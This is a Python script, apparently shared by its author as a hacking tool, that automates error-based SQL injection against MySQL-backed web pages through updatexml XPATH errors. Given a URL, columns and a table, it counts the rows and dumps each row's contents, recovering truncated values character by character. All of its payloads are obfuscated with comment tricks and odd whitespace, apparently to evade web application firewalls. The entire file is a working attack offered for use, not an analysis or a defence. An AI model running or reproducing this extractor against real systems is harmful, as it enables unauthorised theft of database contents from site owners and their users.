########################################
# I hope this tool is useful to you :) #                                
# ~Huss~                               #
# t.me/Hussius                         #
########################################


import requests
import re
import sys



def get_num_rows(base_url,get_columns,table):
    columns = get_columns.split(',')
    obfuscated_columns = ",0x3a,".join([f"%0C%09/*!00000{s}/**_**/*/%0C%09" for s in columns])
    page_url = f"{base_url} and /*!updatexml/**_**/*/(null,/*!concat/**_**/*/(0x3a,(/*!concat/**_**/*/((/*!50000select/**_**/*/ count(/*!concat/**_**/*/({obfuscated_columns})) from (%0C%09/*!00000{table}/**_**/*/%0C%09) limit 0,1)))),null)--+-"
    response = requests.get(page_url)
    if 'XPATH syntax error:' in response.text:
       data = re.search(r"XPATH syntax error: &#039;:(.*?)&#039;|XPATH syntax error: ':(.*?)'", response.text)
       if data:
          final_resp = data.group(1).replace('...',"") if data.group(1) else data.group(2).replace('...',"")
          num_rows = final_resp
          print(f"\nTarget Table : {table} \nNumber of Rows ({num_rows})\n") 
          return num_rows
    
    
def error_based(base_url,get_columns,table,num_rows):
    # Loop through each row
    for row in range(0,int(num_rows)):
        columns = get_columns.split(',')
        obfuscated_columns = ",0x3a,".join([f"%0C%09/*!00000{s}/**_**/*/%0C%09" for s in columns])
        page_url = f"{base_url} and /*!updatexml/**_**/*/(null,/*!concat/**_**/*/(0x3a,(/*!concat/**_**/*/((/*!50000select/**_**/*/ /*!concat/**_**/*/({obfuscated_columns}) from (%0C%09/*!00000{table}/**_**/*/%0C%09)  limit {row},1)))),null)--+-"
        page_url_count =f"{base_url} and /*!updatexml/**_**/*/(null,/*!concat/**_**/*/(0x3a,(/*!concat/**_**/*/((/*!50000select/**_**/*/ /*!00000length/**_**/*/(/*!concat/**_**/*/({obfuscated_columns})) from (%0C%09/*!00000{table}/**_**/*/%0C%09) limit {row},1)))),null)--+-"
        response = requests.get(page_url)
        response_count = requests.get(page_url_count)

        if 'XPATH syntax error:' in response.text:
            #Trying to recognize the error in case of html entities encoding, as is the case in some frameworks
            data = re.search(r"XPATH syntax error: &#039;:(.*?)&#039;|XPATH syntax error: ':(.*?)'", response.text) 
            data_count = re.search(r"XPATH syntax error: &#039;:(.*?)&#039;|XPATH syntax error: ':(.*?)'", response_count.text)  

            if data and data_count:
               #Switch to the normal pattern if there is no html entities encoding & remove '...' from the output if it's too long 
               data_cl= data.group(1).replace('...',"") if data.group(1) else data.group(2).replace('...',"")
               actual_data_len = data_count.group(1) if data_count.group(1) else data_count.group(2)
               lend = len(data_cl)  
               print(f"{row} {data_cl}   [actual length : {actual_data_len} -  extracted chars : {lend}]")
               data_n=int(actual_data_len)
               lend_n=int(lend)
               if(lend_n < int(actual_data_len)):
                    extracted_data = ""
                    for j in range(lend_n+1,data_n+1):
                        query = f"{base_url} and /*!updatexml/**_**/*/(null,/*!concat/**_**/*/(0x3a,(/*!concat/**_**/*/((/*!00000select/**_**/*/ /*!left/**_**/*/(/*!right/**_**/*/(/*!concat/**_**/*/({obfuscated_columns}),{data_n+1}-{j}),1) from (%0C%09/*!00000{table}/**_**/*/%0C%09) limit  {row},1)))),null)--+-"
                      
                   
                        r = requests.get(query)
                        if "XPATH syntax" in r.text:
                            extracted_data = re.search(r"XPATH syntax error: &#039;:(.*?)&#039;|XPATH syntax error: ':(.*?)'", r.text)
                            if extracted_data:
                               extracted_final = extracted_data.group(1) if extracted_data.group(1) else extracted_data.group(2)
                               print(extracted_final)
                            
            
def main():
    base_url = sys.argv[1]
    get_columns = sys.argv[2]
    table = sys.argv[3]
    num_rows = get_num_rows(base_url,get_columns,table)
    error_based(base_url,get_columns,table,num_rows)


if __name__ == "__main__":
    main()
